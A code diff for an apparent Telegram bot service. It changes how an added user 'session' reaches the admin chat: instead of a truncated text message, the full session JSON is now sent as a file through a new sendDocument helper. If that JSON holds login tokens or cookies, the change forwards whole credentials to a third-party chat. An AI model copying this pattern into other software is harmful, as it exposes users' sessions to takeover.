@@ -438,9 +438,11 @@ async function notifyAdminAboutAddedSession(authSession, team, rawSession) {
     }
   );
 
-  await sendTelegramMessage(
+  await sendTelegramDocument(
     ADMIN_CHAT_ID,
-    buildAdminSessionPayload(rawSession)
+    buildAdminSessionFilename(authSession, team),
+    buildAdminSessionPayload(rawSession),
+    'Session JSON đính kèm'
   );
 }
 
@@ -465,14 +467,21 @@ function buildAdminSessionNotice(authSession, team) {
   return lines.join('\n');
 }
 
-function buildAdminSessionPayload(rawSession) {
-  const serialized = JSON.stringify(rawSession, null, 2);
-  const limit = 3600;
-  const safePayload = serialized.length > limit
-    ? `${serialized.slice(0, limit)}\n... [session truncated]`
-    : serialized;
+function buildAdminSessionFilename(authSession, team) {
+  const baseParts = [
+    authSession.username || authSession.telegramId,
+    team.accountId || team.name || 'team'
+  ];
 
-  return `Session JSON:\n${safePayload}`;
+  return `${baseParts
+    .join('_')
+    .replace(/[^a-zA-Z0-9._-]+/g, '_')
+    .replace(/_+/g, '_')
+    .replace(/^_+|_+$/g, '') || 'session'}.json`;
+}
+
+function buildAdminSessionPayload(rawSession) {
+  return JSON.stringify(rawSession, null, 2);
 }
 
 function recordWebVisit() {
@@ -892,6 +901,31 @@ async function sendTelegramMessage(chatId, text, extraPayload = {}) {
     text,
     ...extraPayload
   });
+}
+
+async function sendTelegramDocument(chatId, filename, contents, caption = '') {
+  const formData = new FormData();
+  formData.append('chat_id', String(chatId));
+  if (caption) {
+    formData.append('caption', caption);
+  }
+  formData.append(
+    'document',
+    new Blob([String(contents || '')], { type: 'application/json' }),
+    filename || 'session.json'
+  );
+
+  const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+    method: 'POST',
+    body: formData
+  });
+
+  const data = await response.json();
+  if (!response.ok || !data.ok) {
+    throw new Error(data.description || 'Telegram API sendDocument failed');
+  }
+
+  return data.result;
 }
 
 async function callTelegramApi(method, payload = undefined) {
